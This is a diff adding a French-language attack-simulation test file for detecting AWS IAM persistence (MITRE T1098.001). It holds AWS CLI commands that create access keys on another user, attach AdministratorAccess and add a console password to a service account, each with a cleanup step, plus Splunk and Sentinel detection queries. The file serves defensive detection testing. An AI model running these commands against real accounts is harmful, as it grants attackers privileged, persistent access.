@@ -1,0 +1,90 @@
+attack_technique: T1098.001
+display_name: AWS IAM Persistence
+related_sigma_rule: ../aws_iam_persistence.yml
+expected_alert_within_seconds: 600
+prerequisites:
+  - Compte AWS de lab dédié (NE PAS utiliser un compte prod)
+  - CloudTrail activé multi-region avec ingestion vers SIEM
+  - User IAM avec policy IAMFullAccess (utilisateur de test)
+  - AWS CLI configuré avec credentials du user de test
+warning: |
+  Tests IAM destructifs en environnement réel — restreindre absolument à un
+  compte AWS dédié au lab. Toujours nettoyer immédiatement après le test.
+atomic_tests:
+  - name: Création d'une access key sur un autre utilisateur (privesc classique)
+    description: |
+      Simule un attaquant qui, ayant compromis un user avec IAM privileges,
+      crée une access key sur un user privilégié pour pivoter.
+    supported_platforms: [linux, macos, windows]
+    input_arguments:
+      target_user:
+        description: User cible existant dans le compte lab
+        type: string
+        default: "lab-test-user"
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        aws iam create-access-key --user-name #{target_user}
+      cleanup_command: |
+        KEY_ID=$(aws iam list-access-keys --user-name #{target_user} \
+          --query 'AccessKeyMetadata[?CreateDate==`'$(date -u +%Y-%m-%d)'`].AccessKeyId' \
+          --output text)
+        for k in $KEY_ID; do
+          aws iam delete-access-key --user-name #{target_user} --access-key-id $k
+        done
+
+  - name: Attachement de AdministratorAccess à un user
+    description: |
+      Simule l'élévation de privilèges en attachant la policy managed
+      AdministratorAccess à un user de lab.
+    supported_platforms: [linux, macos, windows]
+    input_arguments:
+      target_user:
+        description: User cible
+        type: string
+        default: "lab-test-user"
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        aws iam attach-user-policy --user-name #{target_user} \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      cleanup_command: |
+        aws iam detach-user-policy --user-name #{target_user} \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+  - name: Création d'un login profile sur un compte service
+    description: |
+      Simule la création d'un mot de passe console sur un user prévu pour
+      être API-only — méthode de persistance furtive.
+    supported_platforms: [linux, macos, windows]
+    input_arguments:
+      service_user:
+        description: User service de lab sans login profile préalable
+        type: string
+        default: "lab-service-user"
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        TEMP_PWD="LabTest!$(date +%s)"
+        aws iam create-login-profile --user-name #{service_user} \
+          --password "$TEMP_PWD" --password-reset-required
+      cleanup_command: |
+        aws iam delete-login-profile --user-name #{service_user} 2>/dev/null || true
+validation_queries:
+  splunk: |
+    index=cloudtrail eventSource=iam.amazonaws.com earliest=-15m
+    | where match(eventName, "(?i)(CreateAccessKey|CreateLoginProfile|AttachUserPolicy)")
+    | table _time, eventName, userIdentity.arn, requestParameters
+  sentinel: |
+    AWSCloudTrail
+    | where TimeGenerated > ago(15m)
+    | where EventSource == "iam.amazonaws.com"
+    | where EventName in ("CreateAccessKey","CreateLoginProfile","AttachUserPolicy")
+    | project TimeGenerated, EventName, UserIdentityArn, RequestParameters
+references:
+  - https://github.com/DataDog/stratus-red-team
+  - https://github.com/RhinoSecurityLabs/pacu
+  - https://attack.mitre.org/techniques/T1098/001/
